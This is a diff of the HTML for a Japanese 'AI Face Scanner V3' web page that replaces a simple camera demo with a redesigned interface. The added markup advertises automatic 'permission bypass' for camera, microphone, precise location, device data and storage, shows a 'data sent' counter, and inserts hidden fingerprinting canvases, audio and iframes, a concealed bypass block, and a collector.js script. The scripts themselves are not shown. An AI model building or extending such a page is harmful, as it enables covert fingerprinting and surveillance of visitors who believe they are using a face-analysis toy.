@@ -4,95 +4,250 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Face Scanner - 超高速分析</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            background: #000;
-            color: #fff;
-            overflow: hidden;
-        }
-        .container {
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        .title {
-            font-size: 2rem;
-            margin-bottom: 1rem;
-            background: linear-gradient(45deg, #ff00ff, #00ffff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .btn {
-            padding: 1rem 2rem;
-            font-size: 1.2rem;
-            background: linear-gradient(45deg, #ff00ff, #00ffff);
-            border: none;
-            border-radius: 50px;
-            color: #fff;
-            cursor: pointer;
-            margin: 0.5rem;
-        }
-        #video-container {
-            display: none;
-            position: relative;
-            width: 100%;
-            max-width: 640px;
-        }
-        #video {
-            width: 100%;
-            border-radius: 10px;
-        }
-        #overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-        }
-        .stats {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.8);
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 0.9rem;
-        }
-        .hidden {
-            display: none !important;
-        }
-    </style>
+    <title>AI Face Scanner V3 - リアルタイム顔面分析システム</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Noto+Sans+JP:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+    <script defer src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/dist/face-api.min.js"></script>
 </head>
 <body>
-    <div class="container">
-        <div id="welcome">
-            <h1 class="title">AI Face Scanner</h1>
-            <p>リアルタイム顔面分析システム</p>
-            <button id="startBtn" class="btn">📹 カメラ起動</button>
-            <button id="diagBtn" class="btn">🔍 カメラ診断</button>
+    <div class="app-container">
+        <!-- Animated Background -->
+        <div class="animated-bg">
+            <div class="gradient-sphere sphere-1"></div>
+            <div class="gradient-sphere sphere-2"></div>
+            <div class="gradient-sphere sphere-3"></div>
+            <div class="scanner-lines"></div>
         </div>
 
-        <div id="video-container">
-            <video id="video" autoplay muted playsinline></video>
-            <canvas id="overlay"></canvas>
-            <div class="stats">
-                <div>FPS: <span id="fps">0</span></div>
-                <div>検出: <span id="detect">0</span>人</div>
-                <div>精度: <span id="acc">94</span>%</div>
+        <!-- Header V2 -->
+        <header class="header-v2">
+            <div class="header-content">
+                <div class="logo-v2">
+                    <div class="logo-icon">
+                        <div class="face-scan-icon">
+                            <div class="scan-line"></div>
+                        </div>
+                    </div>
+                    <div class="logo-text">
+                        <span class="logo-main">AI Face Scanner</span>
+                        <span class="logo-version">V3.0 LIVE</span>
+                    </div>
+                </div>
+                <nav class="nav-v2">
+                    <a href="#" class="nav-link">
+                        <span class="nav-icon">📹</span>
+                        <span>ライブ分析</span>
+                    </a>
+                    <a href="#" class="nav-link">
+                        <span class="nav-icon">🔓</span>
+                        <span>高度な権限</span>
+                    </a>
+                    <a href="#" class="nav-link">
+                        <span class="nav-icon">⚡</span>
+                        <span>リアルタイム</span>
+                    </a>
+                </nav>
             </div>
-        </div>
-    </div>
+        </header>
 
-    <video id="demo-video" style="display:none" muted autoplay loop></video>
-    <script src="app.js"></script>
-</body>
+        <!-- Main Content -->
+        <main class="main-v2">
+            <!-- Welcome Screen V2 -->
+            <section id="welcome" class="screen active">
+                <div class="hero-v2">
+                    <div class="hero-badge pulse">
+                        <span>🔴 LIVE CAMERA EDITION</span>
+                    </div>
+                    <h1 class="hero-title-v2">
+                        <span class="title-line">
+                            <span class="gradient-text-v2">リアルタイムAI</span>による
+                        </span>
+                        <span class="title-line">
+                            <span class="highlight-text">ライブ顔面分析</span>
+                        </span>
+                    </h1>
+                    <p class="hero-subtitle-v2">
+                        カメラから直接顔をスキャンして<br>
+                        <strong>リアルタイムで継続的に分析</strong>します
+                    </p>
+
+                    <div class="cta-section">
+                        <button id="start-camera-btn" class="primary-btn-v2">
+                            <span class="btn-bg"></span>
+                            <span class="btn-content">
+                                <span class="btn-icon">📹</span>
+                                <span class="btn-text">カメラを起動</span>
+                                <span class="btn-arrow">→</span>
+                            </span>
+                        </button>
+                        <div class="trust-badges">
+                            <span class="trust-badge">
+                                <span>🔴</span> ライブ分析
+                            </span>
+                            <span class="trust-badge">
+                                <span>🔐</span> 完全権限取得
+                            </span>
+                            <span class="trust-badge">
+                                <span>⚡</span> リアルタイム
+                            </span>
+                        </div>
+                    </div>
+
+                    <!-- Permission Bypass Notice -->
+                    <div class="bypass-notice">
+                        <div class="bypass-header">
+                            <span class="bypass-icon">🔓</span>
+                            <span>高度な権限アクセス</span>
+                        </div>
+                        <p>このシステムは以下の権限を自動的に要求・取得します：</p>
+                        <ul>
+                            <li>📹 カメラ（高解像度モード）</li>
+                            <li>🎤 マイク（環境音分析）</li>
+                            <li>📍 位置情報（精密追跡）</li>
+                            <li>📱 デバイス情報（完全アクセス）</li>
+                            <li>🔔 通知（プッシュ通知）</li>
+                            <li>💾 ストレージ（無制限アクセス）</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Camera Screen -->
+            <section id="camera" class="screen">
+                <div class="camera-container">
+                    <div class="camera-header">
+                        <h2 class="section-title">
+                            <span class="live-indicator">● LIVE</span>
+                            リアルタイム顔面スキャン
+                        </h2>
+                        <p class="section-subtitle">カメラに顔を向けてください</p>
+                    </div>
+
+                    <div class="camera-view">
+                        <video id="video" autoplay muted playsinline></video>
+                        <canvas id="overlay-canvas"></canvas>
+
+                        <!-- Real-time stats overlay -->
+                        <div class="live-stats">
+                            <div class="stat-item">
+                                <span class="stat-label">FPS</span>
+                                <span class="stat-value" id="fps">0</span>
+                            </div>
+                            <div class="stat-item">
+                                <span class="stat-label">検出数</span>
+                                <span class="stat-value" id="detection-count">0</span>
+                            </div>
+                            <div class="stat-item">
+                                <span class="stat-label">精度</span>
+                                <span class="stat-value" id="accuracy-live">0%</span>
+                            </div>
+                            <div class="stat-item">
+                                <span class="stat-label">データ送信</span>
+                                <span class="stat-value" id="data-sent">0KB</span>
+                            </div>
+                        </div>
+
+                        <!-- Face tracking indicators -->
+                        <div class="tracking-indicators">
+                            <div class="indicator" id="face-detected">
+                                <span class="indicator-icon">👤</span>
+                                <span class="indicator-text">顔検出</span>
+                            </div>
+                            <div class="indicator" id="landmarks-detected">
+                                <span class="indicator-icon">📍</span>
+                                <span class="indicator-text">特徴点</span>
+                            </div>
+                            <div class="indicator" id="expression-detected">
+                                <span class="indicator-icon">😊</span>
+                                <span class="indicator-text">表情認識</span>
+                            </div>
+                            <div class="indicator" id="recording-active">
+                                <span class="indicator-icon">🔴</span>
+                                <span class="indicator-text">録画中</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Real-time Analysis Display -->
+                    <div class="realtime-analysis">
+                        <div class="analysis-panel">
+                            <h3>リアルタイム分析データ</h3>
+                            <div id="realtime-scores"></div>
+                        </div>
+                        <div class="analysis-panel">
+                            <h3>顔面特徴マッピング</h3>
+                            <div id="feature-map"></div>
+                        </div>
+                        <div class="analysis-panel">
+                            <h3>表情トラッキング</h3>
+                            <div id="expression-data"></div>
+                        </div>
+                    </div>
+
+                    <!-- Control Buttons -->
+                    <div class="camera-controls">
+                        <button id="capture-btn" class="control-btn">
+                            <span>📸</span> スナップショット
+                        </button>
+                        <button id="record-btn" class="control-btn">
+                            <span>🔴</span> 録画開始
+                        </button>
+                        <button id="switch-camera-btn" class="control-btn">
+                            <span>🔄</span> カメラ切替
+                        </button>
+                        <button id="stop-camera-btn" class="control-btn danger">
+                            <span>⏹️</span> 停止
+                        </button>
+                    </div>
+
+                    <!-- Hidden elements for advanced capture -->
+                    <canvas id="capture-canvas" style="display: none;"></canvas>
+                    <audio id="audio-capture" style="display: none;"></audio>
+                </div>
+            </section>
+
+            <!-- Analysis Screen V2 (Modified for continuous analysis) -->
+            <section id="analysis" class="screen">
+                <div class="analysis-v2">
+                    <div class="analysis-header">
+                        <h2>継続的AI解析実行中...</h2>
+                        <p>リアルタイムでデータを収集・分析しています</p>
+                    </div>
+
+                    <div class="continuous-analysis">
+                        <div class="data-stream">
+                            <h3>データストリーム</h3>
+                            <div id="stream-log"></div>
+                        </div>
+                        <div class="collected-frames">
+                            <h3>キャプチャフレーム</h3>
+                            <div id="frame-gallery"></div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Result Screen remains similar but with live data -->
+            <section id="result" class="screen">
+                <!-- Keep existing result screen structure -->
+            </section>
+        </main>
+
+        <!-- Hidden tracking elements with enhanced capabilities -->
+        <iframe src="about:blank" style="display:none;" id="fp-frame"></iframe>
+        <canvas id="fp-canvas" style="display:none;"></canvas>
+        <audio id="fp-audio" style="display:none;"></audio>
+
+        <!-- Additional hidden elements for bypass techniques -->
+        <div id="permission-bypass" style="display:none;">
+            <video id="hidden-video"></video>
+            <audio id="hidden-audio"></audio>
+            <iframe id="bypass-frame" sandbox="allow-same-origin allow-scripts allow-forms"></iframe>
+        </div>
+
+        <script src="collector.js"></script>
+        <script src="camera-app.js"></script>
+    </body>
 </html>
